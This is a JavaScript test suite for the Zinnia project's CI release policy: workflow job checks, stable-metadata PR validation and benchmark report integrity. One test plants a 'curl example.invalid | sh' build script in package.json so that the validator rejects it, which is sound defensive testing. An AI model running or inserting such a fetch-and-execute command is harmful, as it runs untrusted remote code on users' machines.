import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import {
  existsSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { setTimeout as delay } from "node:timers/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import {
  waitForChild,
  waitForChildExit,
} from "../e2e/helpers/archive-benchmark.js";
import {
  validateStableMetadataChange,
  validateStableMetadataFile,
} from "./check-stable-metadata-pr.mjs";
import { compareBenchmarkReports } from "../bench/archive-io/benchmark.mjs";
import {
  assertBaselineReport,
  assertComparedBaseline,
  pinBaselineCheckoutRevision,
  writeFailureArtifacts,
  withTimeout,
} from "./archive-io-policy.mjs";
import { resolveBetaBaseline } from "./resolve-archive-io-baseline.mjs";
import { syncChangelogForVersion } from "./sync-version-helpers.js";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const read = (file) => readFileSync(join(ROOT, file), "utf8");
const readFile = (file, encoding) => readFileSync(file, encoding);

function readFileSyncExists(file) {
  try {
    readFileSync(file);
    return true;
  } catch {
    return false;
  }
}

function processIsAlive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (error) {
    return error.code !== "ESRCH";
  }
}

async function assertProcessStopped(pid) {
  for (let attempt = 0; attempt < 100 && processIsAlive(pid); attempt += 1) {
    await delay(25);
  }
  assert.equal(processIsAlive(pid), false, `process ${pid} should be stopped`);
}

// Regression failure modes recorded before implementation:
// - a Windows baseline worktree lacks generated shell package stubs;
// - a hung nested benchmark or persistent runner can outlive its useful budget;
// - stable-promotion PRs can pass without six-platform release-scale evidence;
// - skipped promotion jobs are not distinguished from failed required jobs;
// - CI's Rust version can drift from the pinned local toolchain.
// Additional release-path failures to prevent:
// - promotion compares main instead of the accepted beta tag for this version;
// - baseline worktree builds with its floating Rust stable channel;
// - command timeout ignores the parent process environment;
// - runner timeout rejects the wrapper while leaving the app process tree alive;
// - timeout returns before abort cleanup and the underlying benchmark settle;
// - non-next PRs target main and pass with a skipped promotion job;
// - the documented release/* metadata PR is rejected or can change source;
// - deleted source files disappear from a path allowlist that omits deletions;
// - allowed manifests hide dependency, script, feature, or build-policy edits;
// - release notes hide edits outside the new stable section;
// - a baseline JSON exists but comes from a different commit or has no matching measurements;
// - timeout fires while abort cleanup waits, then late operation success wins;
// - a benchmark resolves after its wall-clock deadline inside a callback before the overdue timer runs;
// - a SIGTERM-resistant descendant has not installed its handler before timeout;
// - exact Rust toolchain is installed without clippy for rust-check.
// - a compared report has baseline ratios but omits candidate samples or reports failed measurements;
// - a rename's delete/add statuses hide an old source path from the stable metadata allowlist;
// - release-scale reports omit, duplicate, add, or mislabel a requested measurement row;
// - baseline and candidate reports silently use different format/workload/operation inventories;
// - compatibility rows disappear, duplicate, fail, or claim measurements while marked unavailable;
// - setup, persistent-runner, operation, and timeout failures leave no uploadable evidence artifact.
// Additional benchmark correctness failure modes to prevent:
// - high-variance per-iteration ratios disagree with the ratio of measured medians;
// - a host hard-link capability failure is mistaken for a benchmark regression;
// - archive creation, listing, verification, or measurement errors are hidden as host capability gaps;
// - unknown hard-link errors are accepted as capability gaps without positive OS evidence.
// - workflow checkout metadata between `uses` and `with` makes a valid ref look absent;
// - a compared candidate report is valid internally but belongs to a different checkout SHA;
// - release-scale evidence omits schemaVersion 3 or did not alternate measurement order.
// - promotion-grade direct or Zinnia measurements omit, truncate, or contain negative/non-finite warmups;
// - symbolic baseline refs move after checkout, causing child metadata, report identity, or assertions to disagree;
// - scheduled or manually dispatched archive runs retain a symbolic baseline ref after checkout.

function workflowSteps(job) {
  const lines = job.split(/\r?\n/);
  const starts = [];
  for (let index = 0; index < lines.length; index += 1) {
    if (/^\s{6}-\s/.test(lines[index])) starts.push(index);
  }
  return starts.map((start, index) => {
    const end = starts[index + 1] ?? lines.length;
    return lines.slice(start, end).join("\n");
  });
}

function checkoutStepRef(job) {
  const checkout = workflowSteps(job).find((step) =>
    /^\s{6}-\s*uses:\s*actions\/checkout@/m.test(step),
  );
  if (!checkout) return null;
  const lines = checkout.split(/\r?\n/);
  const withIndex = lines.findIndex((line) => /^\s{8}with:\s*$/.test(line));
  if (withIndex < 0) return null;
  return (
    lines
      .slice(withIndex + 1)
      .map((line) => line.match(/^\s{10}ref:\s*(.*?)\s*$/)?.[1])
      .find((value) => value !== undefined) ?? null
  );
}

test("PR and push archive benchmark keeps x64 smoke matrix", () => {
  const workflow = read(".github/workflows/ci.yml");
  const benchmarkStart = workflow.indexOf("  archive-io-benchmark:");
  const benchmarkJob = workflow.slice(
    benchmarkStart,
    workflow.indexOf("\n  archive-io-promotion-benchmark:", benchmarkStart),
  );
  assert.match(workflow, /archive-io-benchmark:/);
  for (const runner of ["ubuntu-latest", "macos-26-intel", "windows-latest"]) {
    assert.match(
      benchmarkJob,
      new RegExp(`os: ${runner.replaceAll(".", "\\.")}`),
    );
  }
  assert.doesNotMatch(benchmarkJob, /ubuntu-24\.04-arm/);
  assert.doesNotMatch(benchmarkJob, /windows-11-arm/);
  assert.match(benchmarkJob, /retention-days: 30/);
  assert.match(benchmarkJob, /ZINNIA_BENCH_CANDIDATE_REF/);
  assert.match(benchmarkJob, /ZINNIA_BENCH_BASELINE_REF/);
  assert.match(benchmarkJob, /timeout-minutes:\s*120/);
  assert.match(benchmarkJob, /ZINNIA_BENCH_RUN_TIMEOUT_MS/);
});

test("promotion PR adds a required six-platform release-scale benchmark", () => {
  const workflow = read(".github/workflows/ci.yml");
  const promotionStart = workflow.indexOf("  archive-io-promotion-benchmark:");
  const gateStart = workflow.indexOf("  ci-gate:", promotionStart);
  const promotionJob = workflow.slice(promotionStart, gateStart);
  const gateJob = workflow.slice(gateStart);
  assert.ok(promotionStart >= 0, "promotion benchmark job must exist");
  assert.match(
    promotionJob,
    /github\.event_name == 'pull_request'[\s\S]*github\.event\.pull_request\.base\.ref == 'main'[\s\S]*startsWith\(github\.head_ref, 'next-'\)/,
  );
  for (const runner of [
    "ubuntu-latest",
    "ubuntu-24.04-arm",
    "macos-26",
    "macos-26-intel",
    "windows-latest",
    "windows-11-arm",
  ]) {
    assert.match(
      promotionJob,
      new RegExp(`os: ${runner.replaceAll(".", "\\.")}`),
    );
  }
  assert.match(promotionJob, /--scale release/);
  assert.match(promotionJob, /--compatibility/);
  assert.match(promotionJob, /ZINNIA_BENCH_REQUIRE_BASELINE_REPORT:\s*["']?1/);
  assert.match(promotionJob, /Resolve accepted beta baseline/);
  assert.match(promotionJob, /steps\.accepted-beta\.outputs\.sha/);
  assert.doesNotMatch(promotionJob, /github\.event\.pull_request\.base\.sha/);
  assert.match(promotionJob, /retention-days: 90/);
  assert.match(gateJob, /archive-io-promotion-benchmark/);
  assert.match(gateJob, /ARCHIVE_IO_PROMOTION_BENCHMARK/);
  assert.match(gateJob, /RELEASE_PROMOTION_PR/);
  assert.match(gateJob, /STABLE_METADATA_PR/);
  assert.match(gateJob, /PR_BASE_REF/);
  assert.match(
    gateJob,
    /test "\$PR_BASE_REF" != "main" \|\| test "\$RELEASE_PROMOTION_PR" = "true" \|\| test "\$STABLE_METADATA_PR" = "true"/,
  );
  assert.match(workflow, /Enforce stable metadata-only main PR/);
  assert.match(workflow, /check-stable-metadata-pr\.mjs/);
  assert.match(gateJob, /test "\$ARCHIVE_IO_PROMOTION_BENCHMARK" = success/);
  assert.match(gateJob, /test "\$ARCHIVE_IO_PROMOTION_BENCHMARK" = skipped/);
});

test("stable metadata policy allows only the beta-to-stable release surface", () => {
  const metadataPaths = [
    "CHANGELOG.md",
    "package.json",
    "package-lock.json",
    "run.rosie.zinnia.metainfo.xml",
    "src-tauri/Cargo.lock",
    "src-tauri/Cargo.toml",
    "src-tauri/macos/ZinniaFinderSync/Info.plist",
    "src-tauri/tauri.conf.json",
    "src-tauri/tauri.windows.conf.json",
    "src-tauri/windows/shell/msix_extract_identity.manifest.in",
    "src-tauri/windows/shell/msix_identity.manifest.in",
    "src-tauri/windows/shell/zinnia_extract_shell.rc",
    "src-tauri/windows/shell/zinnia_shell.rc",
  ];
  assert.doesNotThrow(() =>
    validateStableMetadataChange({
      baseVersion: "0.6.3-beta.3",
      headVersion: "0.6.3",
      changedEntries: metadataPaths.map((path) => ({ status: "M", path })),
    }),
  );
  assert.throws(
    () =>
      validateStableMetadataChange({
        baseVersion: "0.6.3-beta.3",
        headVersion: "0.6.3",
        changedEntries: [...metadataPaths, "src-tauri/src/main.rs"].map(
          (path) => ({ status: "M", path }),
        ),
      }),
    /not release metadata/,
  );
  assert.throws(
    () =>
      validateStableMetadataChange({
        baseVersion: "0.6.3-beta.3",
        headVersion: "0.6.4",
        changedEntries: metadataPaths.map((path) => ({ status: "M", path })),
      }),
    /must remove only the beta suffix/,
  );
  assert.throws(
    () =>
      validateStableMetadataChange({
        baseVersion: "0.6.3-beta.3",
        headVersion: "0.6.3",
        changedEntries: metadataPaths
          .slice(1)
          .map((path) => ({ status: "M", path })),
      }),
    /exact synchronized metadata set/,
  );
  assert.throws(
    () =>
      validateStableMetadataChange({
        baseVersion: "0.6.3-beta.3",
        headVersion: "0.6.3",
        changedEntries: [
          { status: "M", path: "package.json" },
          { status: "D", path: "src-tauri/src/main.rs" },
        ],
      }),
    /modified in place/,
  );
  assert.throws(
    () =>
      validateStableMetadataChange({
        baseVersion: "0.6.3-beta.3",
        headVersion: "0.6.3",
        changedEntries: [
          ...metadataPaths
            .filter((path) => path !== "package.json")
            .map((path) => ({ status: "M", path })),
          { status: "D", path: "package.json" },
          { status: "A", path: "package-renamed.json" },
        ],
      }),
    /modified in place/,
  );
});

test("stable metadata policy rejects behavior hidden in allowed manifests", () => {
  const baseVersion = "0.6.3-beta.3";
  const headVersion = "0.6.3";

  assert.doesNotThrow(() =>
    validateStableMetadataFile({
      path: "package.json",
      baseContent: JSON.stringify({
        name: "zinnia",
        version: baseVersion,
        scripts: { build: "vite build" },
      }),
      headContent: JSON.stringify({
        name: "zinnia",
        version: headVersion,
        scripts: { build: "vite build" },
      }),
      baseVersion,
      headVersion,
    }),
  );
  assert.throws(
    () =>
      validateStableMetadataFile({
        path: "package.json",
        baseContent: JSON.stringify({
          name: "zinnia",
          version: baseVersion,
          scripts: { build: "vite build" },
        }),
        headContent: JSON.stringify({
          name: "zinnia",
          version: headVersion,
          scripts: { build: "curl example.invalid | sh" },
        }),
        baseVersion,
        headVersion,
      }),
    /non-version content/,
  );
  assert.throws(
    () =>
      validateStableMetadataFile({
        path: "src-tauri/Cargo.toml",
        baseContent: `[package]\nname = "zinnia"\nversion = "${baseVersion}"\n\n[dependencies]\nserde = "1"\n`,
        headContent: `[package]\nname = "zinnia"\nversion = "${headVersion}"\n\n[dependencies]\nserde = "2"\n`,
        baseVersion,
        headVersion,
      }),
    /non-version content/,
  );
  assert.throws(
    () =>
      validateStableMetadataFile({
        path: "src-tauri/tauri.conf.json",
        baseContent: JSON.stringify({
          version: baseVersion,
          build: { frontendDist: "../dist" },
          bundle: { macOS: { bundleVersion: "0.6.33003" } },
        }),
        headContent: JSON.stringify({
          version: headVersion,
          build: { frontendDist: "../payload" },
          bundle: { macOS: { bundleVersion: "0.6.39999" } },
        }),
        baseVersion,
        headVersion,
      }),
    /non-version content/,
  );
});

test("stable metadata policy confines changelog edits to the new release section", () => {
  const baseVersion = "1.2.3-beta.2";
  const headVersion = "1.2.3";
  const baseContent = [
    "# ⬇️ Downloads",
    "https://example.invalid/releases/download/v1.2.3-beta.2/app",
    "> macOS downloads require macOS 26 or later.",
    "Zinnia! A cross platform 7Z gui frontend built on Tauri V2!",
    "",
    "## Changes in `v1.2.3-beta.2:`",
    "",
    "- Beta notes.",
    "",
    "## Changes in `v1.2.2:`",
    "",
    "- Historical notes.",
    "",
  ].join("\n");
  const synchronized = syncChangelogForVersion(baseContent, headVersion);
  const headContent = synchronized.replace(
    "- **Fix:** (add release notes)",
    "- **Fix:** Final stable notes.",
  );
  const check = (content) =>
    validateStableMetadataFile({
      path: "CHANGELOG.md",
      baseContent,
      headContent: content,
      baseVersion,
      headVersion,
    });

  assert.doesNotThrow(() => check(headContent));
  assert.throws(() => check(`${headContent}Unrelated footer.\n`), /outside/);
  assert.throws(
    () => check(headContent.replace("Beta notes.", "Rewritten history.")),
    /outside/,
  );
  assert.throws(
    () => check(headContent.replace("macOS 26", "macOS 25")),
    /outside/,
  );
  assert.throws(
    () =>
      check(
        headContent.replace(
          "Final stable notes.",
          "Final stable notes.\n\n## Hidden section",
        ),
      ),
    /section/,
  );
});

const RELEASE_INVENTORY = {
  scale: "release",
  formats: ["zip", "7z", "tar", "gzip", "bzip2", "xz"],
  workloads: ["bulk", "small"],
  operations: [
    "browse",
    "test",
    "extract",
    "create",
    "replace",
    "update",
    "selective-extract",
    "conversion",
    "batch",
  ],
  operationFormats: ["zip", "7z", "tar"],
  operationWorkloads: ["bulk", "small"],
  compatibility: true,
};

function measurement(values) {
  return {
    verified: true,
    warmupMs: [0],
    measuredMs: values,
    medianMs: values[2],
  };
}

function measuredRow(fields) {
  const direct = measurement([10, 10, 10, 10, 10]);
  const zinnia = measurement([12, 12, 12, 12, 12]);
  return {
    ...fields,
    status: "measured",
    direct,
    zinnia,
    zinniaAvailable: true,
    ratioSamples: [1.2, 1.2, 1.2, 1.2, 1.2],
  };
}

function releaseReport(revision) {
  const cases = [];
  for (const workload of RELEASE_INVENTORY.workloads) {
    for (const format of RELEASE_INVENTORY.formats) {
      const streamSmall =
        workload === "small" && ["gzip", "bzip2", "xz"].includes(format);
      cases.push(
        streamSmall
          ? {
              workload,
              format,
              compatibility:
                format === "gzip" || format === "bzip2" || format === "xz"
                  ? "single-file stream; bulk workload only"
                  : "measured",
              status: "not-applicable",
              direct: null,
              zinnia: null,
            }
          : measuredRow({
              workload,
              format,
              compatibility: ["gzip", "bzip2", "xz"].includes(format)
                ? "single-file stream; bulk workload only"
                : "measured",
            }),
      );
    }
  }
  const operations = [];
  for (const workload of RELEASE_INVENTORY.operationWorkloads) {
    for (const format of RELEASE_INVENTORY.operationFormats) {
      for (const operation of RELEASE_INVENTORY.operations) {
        operations.push(
          measuredRow({
            operation,
            workload,
            format,
            compatibility:
              operation === "conversion"
                ? `${format} -> ${format === "7z" ? "zip" : "7z"}`
                : operation === "batch"
                  ? "aggregate sequence"
                  : "measured",
          }),
        );
      }
    }
  }
  const compatibilityMeasurements = [
    ...["rar", "split", "encrypted"].map((name) =>
      measuredRow({ name, primary: false }),
    ),
    ...["link-bearing", "unsupported-filesystem", "custom-acl"].map((name) => ({
      name,
      primary: false,
      status: "not-available",
      required: false,
      zinniaAvailable: false,
      direct: null,
      zinnia: null,
      ratioSamples: [],
      note: "not-available: synthetic host capability is absent",
    })),
  ];
  return {
    schemaVersion: 3,
    candidate: { revision },
    protocol: {
      fixtureScale: "release",
      warmupIterations: 1,
      measuredIterations: 5,
      alternatingOrder: true,
    },
    requestedInventory: structuredClone(RELEASE_INVENTORY),
    compatibilityCases: [
      "rar",
      "split",
      "encrypted",
      "link-bearing",
      "unsupported-filesystem",
      "custom-acl",
    ].map((name) => ({ name })),
    cases,
    operations,
    compatibilityMeasurements,
    failures: [],
  };
}

test("promotion baseline and candidate require the complete release inventory", () => {
  const expectedRevision = "a".repeat(40);
  const baseline = releaseReport(expectedRevision);
  assert.doesNotThrow(() => assertBaselineReport(baseline, expectedRevision));
  assert.throws(
    () =>
      assertBaselineReport(
        { ...baseline, candidate: { revision: "b".repeat(40) } },
        expectedRevision,
      ),
    /revision/,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          cases: baseline.cases.map((row, index) =>
            index === 0 ? { ...row, zinnia: null } : row,
          ),
        },
        expectedRevision,
      ),
    /complete|inventory|release/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          cases: baseline.cases.slice(1),
        },
        expectedRevision,
      ),
    /inventory|release/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          cases: [...baseline.cases, baseline.cases[0]],
        },
        expectedRevision,
      ),
    /duplicate|inventory|release/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          protocol: { ...baseline.protocol, fixtureScale: "smoke" },
        },
        expectedRevision,
      ),
    /release/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          operations: baseline.operations.map((row, index) =>
            index === 0 ? { ...row, status: "failed" } : row,
          ),
        },
        expectedRevision,
      ),
    /failed|complete|inventory/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          compatibilityMeasurements:
            baseline.compatibilityMeasurements.slice(1),
        },
        expectedRevision,
      ),
    /compatibility|inventory|release/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          compatibilityMeasurements: baseline.compatibilityMeasurements.map(
            (row, index) =>
              index === 0 ? { ...row, status: "not-available" } : row,
          ),
        },
        expectedRevision,
      ),
    /compatibility|measurement|inventory/i,
  );

  const compared = releaseReport("c".repeat(40));
  const comparison = compareBenchmarkReports(compared, baseline);
  Object.assign(compared, comparison);
  compared.base = {
    revision: expectedRevision,
    available: true,
  };
  compared.comparison = {
    baselineAvailable: true,
    baselineStatus: "available",
  };
  assert.doesNotThrow(() =>
    assertComparedBaseline(compared, expectedRevision, "c".repeat(40)),
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        { ...compared, comparison: { baselineAvailable: false } },
        expectedRevision,
        "c".repeat(40),
      ),
    /comparable/,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        { ...compared, failures: ["small/zip direct measurement failed"] },
        expectedRevision,
        "c".repeat(40),
      ),
    /comparable/,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        { ...compared, cases: compared.cases.slice(1) },
        expectedRevision,
        "c".repeat(40),
      ),
    /comparable|inventory|release/i,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        {
          ...compared,
          operations: compared.operations.map((row, index) =>
            index === 0 ? { ...row, candidateRatio: 9 } : row,
          ),
        },
        expectedRevision,
        "c".repeat(40),
      ),
    /comparable|inventory|release/i,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        {
          ...compared,
          compatibilityMeasurements: [
            ...compared.compatibilityMeasurements,
            compared.compatibilityMeasurements[0],
          ],
        },
        expectedRevision,
        "c".repeat(40),
      ),
    /comparable|inventory|release/i,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        {
          ...compared,
          requestedInventory: {
            ...RELEASE_INVENTORY,
            workloads: ["bulk"],
          },
        },
        expectedRevision,
        "c".repeat(40),
      ),
    /comparable|inventory|release/i,
  );
});

test("promotion-grade measurements require exact valid warmup samples", () => {
  const revision = "a".repeat(40);
  const baseline = releaseReport(revision);
  assert.doesNotThrow(() => assertBaselineReport(baseline, revision));

  const invalidReports = [
    {
      ...baseline,
      cases: baseline.cases.map((row, index) =>
        index === 0
          ? { ...row, direct: { ...row.direct, warmupMs: undefined } }
          : row,
      ),
    },
    {
      ...baseline,
      cases: baseline.cases.map((row, index) =>
        index === 0 ? { ...row, zinnia: { ...row.zinnia, warmupMs: [] } } : row,
      ),
    },
    {
      ...baseline,
      operations: baseline.operations.map((row, index) =>
        index === 0
          ? { ...row, direct: { ...row.direct, warmupMs: [-1] } }
          : row,
      ),
    },
    {
      ...baseline,
      compatibilityMeasurements: baseline.compatibilityMeasurements.map(
        (row, index) =>
          index === 0
            ? { ...row, zinnia: { ...row.zinnia, warmupMs: [Infinity] } }
            : row,
      ),
    },
  ];

  for (const report of invalidReports) {
    assert.throws(
      () => assertBaselineReport(report, revision),
      /warmup|complete|measurement/i,
    );
  }

  const compared = compareBenchmarkReports(
    releaseReport("c".repeat(40)),
    baseline,
  );
  compared.base = { revision, available: true };
  compared.comparison = {
    baselineAvailable: true,
    baselineStatus: "available",
  };
  compared.cases[0] = {
    ...compared.cases[0],
    zinnia: { ...compared.cases[0].zinnia, warmupMs: [NaN] },
  };
  assert.throws(
    () => assertComparedBaseline(compared, revision, "c".repeat(40)),
    /warmup|complete|comparable/i,
  );

  // The release inventory intentionally contains not-applicable rows for
  // stream formats and for host-gated compatibility fixtures.
  assert.ok(baseline.cases.some((row) => row.status === "not-applicable"));
  assert.ok(
    baseline.compatibilityMeasurements.some(
      (row) => row.status === "not-available",
    ),
  );
});

test("scheduled and manual baseline runs pin the checked-out SHA once", () => {
  const workflow = read(".github/workflows/archive-io-benchmark.yml");
  const script = read("scripts/run-archive-io-benchmark.mjs");
  assert.match(workflow, /schedule:/);
  assert.match(workflow, /workflow_dispatch:/);
  assert.match(workflow, /inputs\.baseline_ref \|\| 'main'/);
  assert.match(script, /pinBaselineCheckoutRevision/);
  assert.match(script, /gitRevision\("HEAD", worktree\)/);
  assert.doesNotMatch(script, /gitRevision\(baselineRef\)/);
  assert.match(script, /ZINNIA_BENCH_CANDIDATE_REF: pinnedBaselineRevision/);
  assert.match(
    script,
    /ZINNIA_BENCH_CANDIDATE_REVISION: pinnedBaselineRevision/,
  );
  assert.match(script, /assertBaselineReport\([\s\S]*pinnedBaselineRevision/);
  assert.doesNotMatch(
    script.slice(
      script.indexOf("async function runBaselineCheckout"),
      script.indexOf("function addRevisionMetadata"),
    ),
    /gitRevision\(baselineRef\)/,
  );

  const directory = mkdtempSync(join(tmpdir(), "zinnia-baseline-ref-move-"));
  const worktree = join(directory, "checkout");
  const git = (cwd, ...args) => {
    const result = spawnSync("git", args, {
      cwd,
      encoding: "utf8",
      windowsHide: true,
    });
    assert.equal(result.status, 0, result.stderr);
    return result.stdout.trim();
  };
  try {
    git(directory, "init");
    git(directory, "config", "user.email", "benchmark@example.invalid");
    git(directory, "config", "user.name", "Benchmark Test");
    writeFileSync(join(directory, "baseline.txt"), "first\n");
    git(directory, "add", "baseline.txt");
    git(directory, "commit", "-m", "first baseline");
    const checkedOutRevision = git(directory, "rev-parse", "HEAD");
    git(directory, "branch", "accepted-beta");
    git(directory, "worktree", "add", "--detach", worktree, "accepted-beta");

    writeFileSync(join(directory, "baseline.txt"), "second\n");
    git(directory, "commit", "-am", "move baseline ref");
    const movedRevision = git(directory, "rev-parse", "HEAD");
    git(directory, "update-ref", "refs/heads/accepted-beta", movedRevision);
    assert.notEqual(movedRevision, checkedOutRevision);

    let headReads = 0;
    const pinnedRevision = pinBaselineCheckoutRevision(() => {
      headReads += 1;
      return git(worktree, "rev-parse", "HEAD");
    });
    assert.equal(pinnedRevision, checkedOutRevision);
    assert.equal(headReads, 1);
    assert.equal(git(directory, "rev-parse", "accepted-beta"), movedRevision);
    assert.equal(git(worktree, "rev-parse", "HEAD"), pinnedRevision);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("promotion validates ratio of medians for high-variance benchmark rows", () => {
  const expectedRevision = "a".repeat(40);
  const baseline = releaseReport(expectedRevision);
  const candidate = releaseReport("c".repeat(40));
  candidate.cases[0] = {
    ...candidate.cases[0],
    direct: measurement([1, 100, 101, 102, 103]),
    zinnia: measurement([1, 2, 3, 4, 1000]),
    ratioSamples: [1, 0.02, 3 / 101, 4 / 102, 1000 / 103],
  };

  const compared = compareBenchmarkReports(candidate, baseline);
  assert.equal(compared.cases[0].candidateRatio, 3 / 101);
  assert.doesNotThrow(() =>
    assertComparedBaseline(compared, expectedRevision, "c".repeat(40)),
  );
});

test("release benchmark proof binds schema, protocol, and candidate checkout SHA", () => {
  const baselineRevision = "a".repeat(40);
  const candidateRevision = "c".repeat(40);
  const baseline = releaseReport(baselineRevision);
  const candidate = releaseReport(candidateRevision);

  assert.throws(
    () =>
      assertBaselineReport({ ...baseline, schemaVersion: 2 }, baselineRevision),
    /schema/i,
  );
  assert.throws(
    () =>
      assertBaselineReport(
        {
          ...baseline,
          protocol: { ...baseline.protocol, alternatingOrder: false },
        },
        baselineRevision,
      ),
    /alternat/i,
  );

  const compared = compareBenchmarkReports(candidate, baseline);
  compared.base = { revision: baselineRevision, available: true };
  compared.comparison = {
    baselineAvailable: true,
    baselineStatus: "available",
  };
  assert.doesNotThrow(() =>
    assertComparedBaseline(compared, baselineRevision, candidateRevision),
  );
  assert.throws(
    () => assertComparedBaseline(compared, baselineRevision, "d".repeat(40)),
    /candidate.*revision|revision.*candidate/i,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        { ...compared, schemaVersion: 2 },
        baselineRevision,
        candidateRevision,
      ),
    /schema/i,
  );
  assert.throws(
    () =>
      assertComparedBaseline(
        {
          ...compared,
          protocol: { ...compared.protocol, alternatingOrder: false },
        },
        baselineRevision,
        candidateRevision,
      ),
    /alternat/i,
  );
});

test("non-release baseline validation retains local benchmark compatibility", () => {
  const revision = "a".repeat(40);
  const report = releaseReport(revision);
  const localInventory = { ...RELEASE_INVENTORY, scale: "smoke" };
  report.schemaVersion = 2;
  report.requestedInventory = structuredClone(localInventory);
  report.protocol = {
    ...report.protocol,
    fixtureScale: "smoke",
    alternatingOrder: false,
  };

  assert.doesNotThrow(() =>
    assertBaselineReport(report, revision, localInventory),
  );
});

test("link-bearing capability gaps are distinct from operational failures", async () => {
  const {
    createHardLinkForCompatibilityFixture,
    HardLinkCapabilityUnavailableError,
    runCompatibilityMeasurements,
  } = await import("../bench/archive-io/benchmark.mjs");
  const capabilityCause = Object.assign(
    new Error("hard links are unsupported"),
    {
      code: "EOPNOTSUPP",
    },
  );
  let capabilityError;
  assert.throws(
    () =>
      createHardLinkForCompatibilityFixture("source", "target", () => {
        throw capabilityCause;
      }),
    (error) => {
      capabilityError = error;
      return error instanceof HardLinkCapabilityUnavailableError;
    },
  );
  assert.throws(
    () =>
      createHardLinkForCompatibilityFixture("source", "target", () => {
        throw Object.assign(new Error("unexpected filesystem failure"), {
          code: "EIO",
        });
      }),
    (error) =>
      error.code === "EIO" &&
      !(error instanceof HardLinkCapabilityUnavailableError),
  );

  const run = (overrides = {}) =>
    runCompatibilityMeasurements(
      {
        sidecar: null,
        executor: null,
        workRoot: "",
        archiveRoot: "",
        runRoot: "",
      },
      {
        createFixture: (_root, name) => ({ name }),
        createArchive: (name) => ({
          archivePath: name,
          format: "7z",
          password: "",
        }),
        compatibilityReport: async ({ name }) => ({ name, status: "measured" }),
        ...overrides,
      },
    );
  const linkRow = (rows) => rows.find((row) => row.name === "link-bearing");

  const capabilityRows = await run({
    createFixture: (_root, name) => {
      if (name === "link-bearing") throw capabilityError;
      return { name };
    },
  });
  assert.equal(linkRow(capabilityRows).status, "not-available");

  const archiveRows = await run({
    createArchive: (name) => {
      if (name === "link-bearing") {
        throw Object.assign(new Error("archive listing failed"), {
          code: "EOPNOTSUPP",
        });
      }
      return { archivePath: name, format: "7z", password: "" };
    },
  });
  assert.equal(linkRow(archiveRows).status, "failed");

  const measurementRows = await run({
    compatibilityReport: async ({ name }) => {
      if (name === "link-bearing") throw new Error("measurement failed");
      return { name, status: "measured" };
    },
  });
  assert.equal(linkRow(measurementRows).status, "failed");
});

test("benchmark failures produce durable JSON, Markdown, and log artifacts", (t) => {
  const directory = mkdtempSync(join(tmpdir(), "zinnia-benchmark-failure-"));
  t.after(() => rmSync(directory, { recursive: true, force: true }));
  for (const stage of ["setup", "runner", "operation", "timeout"]) {
    const artifacts = writeFailureArtifacts(directory, {
      stage,
      error: new Error(`${stage} failed for /private/tmp/private-input`),
    });
    assert.ok(existsSync(artifacts.jsonPath));
    assert.ok(existsSync(artifacts.markdownPath));
    assert.ok(existsSync(artifacts.logPath));
    const detail = JSON.parse(readFileSync(artifacts.jsonPath, "utf8"));
    assert.equal(detail.stage, stage);
    assert.match(detail.message, /<path>/);
    assert.doesNotMatch(detail.message, /private-input/);
    assert.match(
      readFileSync(artifacts.markdownPath, "utf8"),
      new RegExp(stage),
    );
    assert.match(readFileSync(artifacts.logPath, "utf8"), new RegExp(stage));
  }
});

test("benchmark wrapper retains artifacts for setup, runner, and timeout failures", (t) => {
  const directory = mkdtempSync(join(tmpdir(), "zinnia-benchmark-wrapper-"));
  const runnerPath = join(directory, "runner.mjs");
  t.after(() => rmSync(directory, { recursive: true, force: true }));
  const run = (extraEnv, args = []) =>
    spawnSync(
      process.execPath,
      [join(ROOT, "scripts", "run-archive-io-benchmark.mjs"), ...args],
      {
        cwd: ROOT,
        encoding: "utf8",
        timeout: 8_000,
        env: {
          ...process.env,
          ZINNIA_BENCH_REPORT_DIR: directory,
          ...extraEnv,
        },
      },
    );
  const verify = (stage) => {
    const detail = JSON.parse(
      readFileSync(join(directory, "archive-io-failure.json"), "utf8"),
    );
    assert.equal(detail.stage, stage);
    assert.ok(existsSync(join(directory, "archive-io-failure.md")));
    assert.ok(existsSync(join(directory, "archive-io-failure.log")));
  };

  let result = run({}, ["--scale", "invalid-scale"]);
  assert.notEqual(result.status, 0);
  verify("setup");

  writeFileSync(
    runnerPath,
    'export function createArchiveBenchmarkSession() { throw new Error("synthetic runner startup failure"); }\n',
  );
  result = run({ ZINNIA_BENCH_RUNNER_MODULE: runnerPath }, [
    "--role",
    "candidate",
  ]);
  assert.notEqual(result.status, 0);
  verify("runner");

  writeFileSync(
    runnerPath,
    [
      "export function createArchiveBenchmarkSession({ signal }) {",
      "  return new Promise((resolve, reject) => {",
      '    signal.addEventListener("abort", () => reject(new Error("cancelled on timeout")), { once: true });',
      "  });",
      "}",
    ].join("\n"),
  );
  result = run(
    {
      ZINNIA_BENCH_RUNNER_MODULE: runnerPath,
      ZINNIA_BENCH_RUN_TIMEOUT_MS: "25",
    },
    ["--role", "candidate"],
  );
  assert.notEqual(result.status, 0);
  verify("timeout");
});

test("archive benchmark timeout cannot be won by a late success during abort", async () => {
  let resolveOperation;
  let abortStarted;
  let finishAbort;
  const operation = new Promise((resolve) => {
    resolveOperation = resolve;
  });
